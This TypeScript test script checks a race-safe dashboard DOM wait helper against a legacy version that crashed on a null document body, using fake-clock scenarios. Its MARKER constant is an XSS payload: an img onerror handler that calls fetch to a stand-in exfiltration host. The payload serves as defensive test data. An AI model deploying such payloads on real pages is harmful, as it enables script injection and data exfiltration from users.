// Deterministic fixtures for the race-safe dashboard DOM wait (issue #146).
//
// Hosted run 29708869818 failed intermittently with
// `TypeError: Cannot read properties of null (reading 'textContent')` because
// the previously shipped inline waitForText dereferenced `document.body`
// before the navigated document committed, and could also accept a stale
// prior-page node that still contained the marker text.
//
// This proof drives BOTH algorithms over identical scripted DOM timelines with
// a fake clock (no real timers, no browser):
//   - the fixed race-safe module (scripts/fixtures/dashboard-dom-wait.ts),
//   - `legacyWaitForText`, a behavioral port of the pre-fix algorithm whose
//     body access throws the exact production TypeError while the body is
//     unmounted and whose readiness ignores navigation generations.
//
// Adversarial checks assert the legacy algorithm exhibits both production
// failure modes on these fixtures while the fixed module produces bounded,
// content-free, generation-gated receipts.

import {
  LoaderGenerationGate,
  domTextReadinessExpression,
  receiptIsContentFree,
  waitForDomText,
  type DashboardReadinessStatus,
  type DomWaitReceipt,
} from "./fixtures/dashboard-dom-wait";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const scriptPath = fileURLToPath(import.meta.url);
const repoRoot = path.resolve(path.dirname(scriptPath), "..");
const securityProofPath = path.join(repoRoot, "scripts", "dashboard-security-proof.ts");

const MARKER = "HTML:<img src=\"https://exfil.invalid/html\" onerror=\"fetch('https://exfil.invalid/html-event')\">";
const NULL_BODY_TYPE_ERROR = "Cannot read properties of null (reading 'textContent')";

type CheckReceipt = { name: string; passed: boolean; detail: string };
const checks: CheckReceipt[] = [];
function check(name: string, passed: unknown, detail: string) {
  const receipt = { name, passed: Boolean(passed), detail };
  checks.push(receipt);
  console.log(`${receipt.passed ? "PASS" : "FAIL"} ${name} — ${detail}`);
}

const tick = () => new Promise<void>((resolve) => setImmediate(resolve));

class FakeClock {
  private currentMs = 0;
  private seq = 0;
  private readonly timers = new Map<number, { at: number; fire: () => void }>();

  now = () => this.currentMs;
  get nowMs() {
    return this.currentMs;
  }
  get pendingCount() {
    return this.timers.size;
  }

  delay(ms: number, guard?: { signal: AbortSignal; abortError: () => Error }): Promise<void> {
    return new Promise<void>((resolve, reject) => {
      let settled = false;
      let id = 0;
      const settle = (error?: Error) => {
        if (settled) return;
        settled = true;
        this.timers.delete(id);
        guard?.signal.removeEventListener("abort", onAbort);
        if (error) reject(error);
        else resolve();
      };
      const onAbort = () =>
        settle(guard ? guard.abortError() : new Error("fixture_delay_aborted"));
      id = ++this.seq;
      this.timers.set(id, { at: this.currentMs + ms, fire: () => settle() });
      guard?.signal.addEventListener("abort", onAbort, { once: true });
      if (guard?.signal.aborted) onAbort();
    });
  }

  async advance(ms: number) {
    const target = this.currentMs + ms;
    for (;;) {
      let dueId: number | undefined;
      let dueAt = Number.POSITIVE_INFINITY;
      for (const [id, timer] of this.timers) {
        if (
          timer.at <= target &&
          (dueId === undefined || timer.at < dueAt)
        ) {
          dueId = id;
          dueAt = timer.at;
        }
      }
      if (dueId === undefined) break;
      const timer = this.timers.get(dueId)!;
      this.timers.delete(dueId);
      this.currentMs = Math.max(this.currentMs, dueAt);
      timer.fire();
      await tick();
    }
    this.currentMs = target;
  }
}

type ProbePhase = { from: number; status: DashboardReadinessStatus | "throw"; errorText?: string };

function scriptedProbe(clock: FakeClock, phases: ProbePhase[]) {
  return async (): Promise<DashboardReadinessStatus> => {
    let active: ProbePhase | undefined;
    for (const phase of phases) {
      if (phase.from <= clock.nowMs && (active === undefined || phase.from > active.from)) {
        active = phase;
      }
    }
    if (!active) return "missing";
    if (active.status === "throw") throw new Error(active.errorText ?? "cdp_socket_closed");
    return active.status;
  };
}

type ScenarioOptions = {
  phases: ProbePhase[];
  committedFrom?: number;
};

async function createScenario(options: ScenarioOptions) {
  const clock = new FakeClock();
  const controller = new AbortController();
  const receiptPromise = waitForDomText(
    {
      probe: scriptedProbe(clock, options.phases),
      delay: (ms) =>
        clock.delay(ms, {
          signal: controller.signal,
          abortError: () => new Error("watchdog_expired"),
        }),
      now: clock.now,
      signal: controller.signal,
      generationCommitted: () =>
        options.committedFrom === undefined || clock.nowMs >= options.committedFrom,
      abortError: () => new Error("watchdog_expired"),
    },
    { timeoutMs: 1_000, pollMs: 50 },
  ).then(
    (receipt) => ({ kind: "receipt" as const, receipt }),
    (error: unknown) => ({ kind: "error" as const, error }),
  );
  // Let the first poll (and, if not immediately satisfied, its poll-timer
  // registration) settle before the fixture is allowed to move the fake
  // clock, so clock advances never race the initial microtask.
  await tick();
  return { clock, controller, receiptPromise };
}

/** Behavioral port of the pre-fix shipped waitForText (issue #146 evidence):
 * dereferences body text directly and has no notion of navigation generations. */
async function legacyWaitForText(
  model: { bodyText: () => string; delay: (ms: number) => Promise<void>; now: () => number },
  timeoutMs: number,
  pollMs: number,
) {
  const deadline = model.now() + timeoutMs;
  while (model.now() < deadline) {
    if (model.bodyText().includes(MARKER)) {
      return { satisfied: true as const, acceptedAtElapsedMs: model.now() - (deadline - timeoutMs) };
    }
    await model.delay(pollMs);
  }
  return { satisfied: false as const };
}

function mulberry32(seed: number) {
  return () => {
    seed |= 0;
    seed = (seed + 0x6d2b79f5) | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function summarize(receipt: DomWaitReceipt) {
  return receipt.ok
    ? { ok: true as const }
    : { ok: false as const, stage: receipt.stage, detail: receipt.detail };
}

async function main() {
  // 1. Immediate mount: ready on the very first poll, zero elapsed fake time.
  {
    const scenario = await createScenario({ phases: [{ from: 0, status: "ready" }] });
    await scenario.clock.advance(20);
    const outcome = await scenario.receiptPromise;
    check(
      "dom_wait_immediate_mount_ready_on_first_poll",
      outcome.kind === "receipt" &&
        outcome.receipt.ok &&
        outcome.receipt.polls === 1 &&
        outcome.receipt.elapsedMs === 0 &&
        scenario.clock.pendingCount === 0,
      JSON.stringify(outcome),
    );
  }

  // 2. Delayed mount just before the deadline: accepted, not raced past.
  {
    const scenario = await createScenario({
      phases: [
        { from: 0, status: "missing" },
        { from: 950, status: "ready" },
      ],
    });
    await scenario.clock.advance(1_200);
    const outcome = await scenario.receiptPromise;
    check(
      "dom_wait_mount_just_before_deadline_accepted",
      outcome.kind === "receipt" &&
        outcome.receipt.ok &&
        outcome.receipt.elapsedMs >= 900 &&
        outcome.receipt.elapsedMs <= 1_000,
      JSON.stringify(outcome),
    );
  }

  // 3. Never mounts: bounded timeout receipt says the node never appeared.
  {
    const scenario = await createScenario({ phases: [{ from: 0, status: "missing" }] });
    await scenario.clock.advance(1_500);
    const outcome = await scenario.receiptPromise;
    check(
      "dom_wait_never_mount_timeout_receipt_distinguishes_missing",
      outcome.kind === "receipt" &&
        !outcome.receipt.ok &&
        outcome.receipt.stage === "dashboard_readiness" &&
        outcome.receipt.detail === "node_never_mounted" &&
        !outcome.receipt.sawNode &&
        !outcome.receipt.markerObserved &&
        scenario.clock.pendingCount === 0,
      JSON.stringify(outcome),
    );
  }

  // 4. Mounted with wrong text forever: distinctly reported.
  {
    const scenario = await createScenario({ phases: [{ from: 0, status: "mounted" }] });
    await scenario.clock.advance(1_500);
    const outcome = await scenario.receiptPromise;
    check(
      "dom_wait_wrong_text_timeout_receipt_distinguishes_mismatch",
      outcome.kind === "receipt" &&
        !outcome.receipt.ok &&
        outcome.receipt.detail === "node_mounted_text_mismatch" &&
        outcome.receipt.sawNode &&
        !outcome.receipt.markerObserved,
      JSON.stringify(outcome),
    );
  }

  // 5. Node mounts without the marker, is temporarily removed entirely
  // (transient gap), then is reinserted carrying the marker: the wait must
  // ride through the removal and recover within the deadline.
  {
    const scenario = await createScenario({
      phases: [
        { from: 0, status: "mounted" },
        { from: 60, status: "missing" },
        { from: 120, status: "ready" },
      ],
    });
    await scenario.clock.advance(500);
    const outcome = await scenario.receiptPromise;
    check(
      "dom_wait_removal_reinsert_recovers_within_deadline",
      outcome.kind === "receipt" &&
        outcome.receipt.ok &&
        outcome.receipt.elapsedMs >= 120 &&
        outcome.receipt.polls >= 4,
      JSON.stringify(outcome),
    );
  }

  // 6. Stale prior-page node: ready-looking text must NOT satisfy a later
  // phase before its own navigation generation commits. The legacy algorithm
  // accepts the stale node at elapsed 0ms — the second production bug.
  {
    const scenario = await createScenario({ phases: [{ from: 0, status: "ready" }], committedFrom: 150 });
    await scenario.clock.advance(800);
    const outcome = await scenario.receiptPromise;

    const staleClock = new FakeClock();
    const legacy = await legacyWaitForText(
      {
        bodyText: () => `${MARKER} (stale desktop render)`,
        delay: (ms) => staleClock.delay(ms),
        now: staleClock.now,
      },
      1_000,
      50,
    );
    check(
      "dom_wait_stale_prior_page_node_gated_by_navigation_generation",
      outcome.kind === "receipt" &&
        outcome.receipt.ok &&
        outcome.receipt.elapsedMs >= 140 &&
        outcome.receipt.elapsedMs <= 1_000 &&
        legacy.satisfied &&
        legacy.acceptedAtElapsedMs === 0,
      JSON.stringify({ fixed: outcome, legacyAcceptedAtElapsedMs: legacy.acceptedAtElapsedMs ?? "n/a" }),
    );
  }

  // 7. THE CI BUG: unmounted body during navigation. Legacy dereferences and
  // throws the exact hosted-run TypeError; the fixed module treats it as
  // pending and succeeds once the body mounts.
  {
    const scenario = await createScenario({
      phases: [
        { from: 0, status: "missing" },
        { from: 200, status: "ready" },
      ],
    });
    await scenario.clock.advance(600);
    const outcome = await scenario.receiptPromise;

    const legacyClock = new FakeClock();
    const legacyOutcome = await legacyWaitForText(
      {
        bodyText: () => {
          if (legacyClock.nowMs < 200) {
            throw new TypeError(NULL_BODY_TYPE_ERROR);
          }
          return MARKER;
        },
        delay: (ms) => legacyClock.delay(ms),
        now: legacyClock.now,
      },
      1_000,
      50,
    ).then(
      () => ({ kind: "satisfied" as const }),
      (error: unknown) => ({ kind: "threw" as const, error }),
    );
    check(
      "dom_wait_unmounted_body_pending_not_null_dereference",
      outcome.kind === "receipt" &&
        outcome.receipt.ok &&
        outcome.receipt.elapsedMs >= 200 &&
        legacyOutcome.kind === "threw" &&
        legacyOutcome.error instanceof TypeError &&
        legacyOutcome.error.message === NULL_BODY_TYPE_ERROR,
      JSON.stringify({ fixed: outcome, legacy: legacyOutcome.kind === "threw" ? String(legacyOutcome.error) : legacyOutcome }),
    );
  }

  // 8. Browser exit mid-wait propagates as its own page/browser failure —
  // never converted into a readiness receipt or retried silently.
  {
    const scenario = await createScenario({
      phases: [
        { from: 0, status: "missing" },
        { from: 30, status: "throw", errorText: "cdp_socket_closed" },
      ],
    });
    await scenario.clock.advance(300);
    const outcome = await scenario.receiptPromise;
    check(
      "dom_wait_browser_exit_propagates_as_page_failure",
      outcome.kind === "error" &&
        outcome.error instanceof Error &&
        outcome.error.message === "cdp_socket_closed" &&
        scenario.clock.pendingCount === 0,
      JSON.stringify(outcome),
    );
  }

  // 9. Outer-watchdog cancellation: abort mid-poll rejects with the watchdog
  // error and every pending timer is settled.
  {
    const scenario = await createScenario({ phases: [{ from: 0, status: "missing" }] });
    await scenario.clock.advance(120);
    scenario.controller.abort();
    const outcome = await scenario.receiptPromise;
    check(
      "dom_wait_outer_watchdog_cancellation_settles_all_timers",
      outcome.kind === "error" &&
        outcome.error instanceof Error &&
        outcome.error.message === "watchdog_expired" &&
        scenario.clock.pendingCount === 0,
      JSON.stringify({ outcome, pendingTimers: scenario.clock.pendingCount }),
    );
  }

  // 10. Receipt privacy: only whitelisted scalar fields, never page content.
  {
    const scenario = await createScenario({ phases: [{ from: 0, status: "mounted" }] });
    await scenario.clock.advance(1_500);
    const outcome = await scenario.receiptPromise;
    const receiptJson = outcome.kind === "receipt" ? JSON.stringify(outcome.receipt) : "";
    check(
      "dom_wait_timeout_receipts_content_free",
      outcome.kind === "receipt" &&
        !outcome.receipt.ok &&
        receiptIsContentFree(outcome.receipt) &&
        !receiptJson.includes(MARKER) &&
        !receiptJson.includes("stale"),
      receiptJson,
    );
  }

  // 11. The shipped probe expression never dereferences a missing body; the
  // pre-fix expression threw the production TypeError on the same inputs.
  {
    const runFixed = (doc: unknown) =>
      new Function("document", `return (${domTextReadinessExpression(MARKER)});`)(doc) as string;
    const runLegacy = (doc: unknown) =>
      new Function("document", `return document.body.textContent.includes(${JSON.stringify(MARKER)});`)(
        doc,
      ) as boolean;

    const cases: Array<{ doc: unknown; expected: string }> = [
      { doc: {}, expected: "missing" },
      { doc: { body: null }, expected: "missing" },
      { doc: { body: { textContent: undefined } }, expected: "missing" },
      { doc: { body: { textContent: "nothing here" } }, expected: "mounted" },
      { doc: { body: { textContent: `prefix ${MARKER} suffix` } }, expected: "ready" },
    ];
    const fixedResults = cases.map((entry) => {
      try {
        return { value: runFixed(entry.doc), expected: entry.expected };
      } catch (error) {
        return { value: `threw:${String(error)}`, expected: entry.expected };
      }
    });
    let legacyThrew = false;
    try {
      runLegacy({});
    } catch {
      legacyThrew = true;
    }
    check(
      "dom_readiness_expression_null_safe_for_every_document_state",
      fixedResults.every((result) => result.value === result.expected) && legacyThrew,
      JSON.stringify({ fixedResults, legacyNullBodyThrew: legacyThrew }),
    );
  }

  // 12. LoaderGenerationGate unit behavior.
  {
    const gate = new LoaderGenerationGate();
    const unarmed = gate.isGenerationCommitted();
    gate.arm("frame-1", "loader-1");
    const mismatchBeforeCommit = gate.isGenerationCommitted();
    gate.observe("frame-1", "loader-2");
    const differentLoaderRejected = gate.isGenerationCommitted();
    gate.observe("frame-1", "loader-1");
    const matchingCommitAccepted = gate.isGenerationCommitted();
    let emptyLoaderRejected = false;
    try {
      gate.arm("frame-1", "");
    } catch {
      emptyLoaderRejected = true;
    }
    check(
      "loader_generation_gate_binds_phase_to_committed_generation",
      !unarmed &&
        !mismatchBeforeCommit &&
        !differentLoaderRejected &&
        matchingCommitAccepted &&
        emptyLoaderRejected,
      JSON.stringify({ unarmed, mismatchBeforeCommit, differentLoaderRejected, matchingCommitAccepted, emptyLoaderRejected }),
    );
  }

  // 13. 150 repeated mobile-style scenarios with jittered commit/mount/render
  // timings produce identical semantic receipts with zero failures.
  {
    const random = mulberry32(146);
    const iterations = 150;
    const semanticReceipts: string[] = [];
    let failures = 0;
    for (let index = 0; index < iterations; index += 1) {
      const commitAt = 10 + Math.floor(random() * 70);
      const mountAt = commitAt + Math.floor(random() * 40);
      const renderAt = mountAt + Math.floor(random() * 60);
      const scenario = await createScenario({
        phases: [
          { from: 0, status: "missing" },
          { from: mountAt, status: "ready" },
        ],
        committedFrom: commitAt,
      });
      const driver = scenario.clock.advance(700).then(() => scenario.receiptPromise).then((outcome) => {
        if (outcome.kind !== "receipt" || !outcome.receipt.ok || scenario.clock.pendingCount !== 0) {
          failures += 1;
          return "failure";
        }
        return JSON.stringify(summarize(outcome.receipt));
      });
      semanticReceipts.push(await driver);
    }
    const unique = [...new Set(semanticReceipts)];
    check(
      "dom_wait_mobile_scenario_150_repeats_identical_semantic_receipts",
      failures === 0 &&
        semanticReceipts.length === iterations &&
        unique.length === 1 &&
        unique[0] === JSON.stringify({ ok: true }),
      JSON.stringify({ iterations, failures, uniqueSemanticReceipts: unique }),
    );
  }

  // 14. Regression gate on the shipped security-proof source: the
  // dereferencing readiness expression must stay absent and the race-safe
  // wiring must stay present.
  {
    const source = fs.readFileSync(securityProofPath, "utf8");
    check(
      "dashboard_security_proof_source_uses_race_safe_generation_gated_wait",
      !source.includes("document.body.textContent.includes(") &&
        source.includes("domTextReadinessExpression") &&
        source.includes("LoaderGenerationGate") &&
        source.includes("Page.frameNavigated") &&
        source.includes("navigationGate.arm(navigation.frameId, navigation.loaderId)") &&
        path.relative(repoRoot, path.dirname(scriptPath)).split(path.sep)[0] === "scripts",
      JSON.stringify({ securityProofPath: path.relative(repoRoot, securityProofPath) }),
    );
  }

  const failed = checks.filter((receipt) => !receipt.passed);
  console.log(JSON.stringify({ proof: "dashboard-dom-wait", checks: checks.length, passed: checks.length - failed.length, failed: failed.map((receipt) => receipt.name) }));
  if (failed.length) process.exitCode = 1;
}

main().catch((error) => {
  console.error(error instanceof Error ? error.stack : String(error));
  process.exitCode = 1;
});
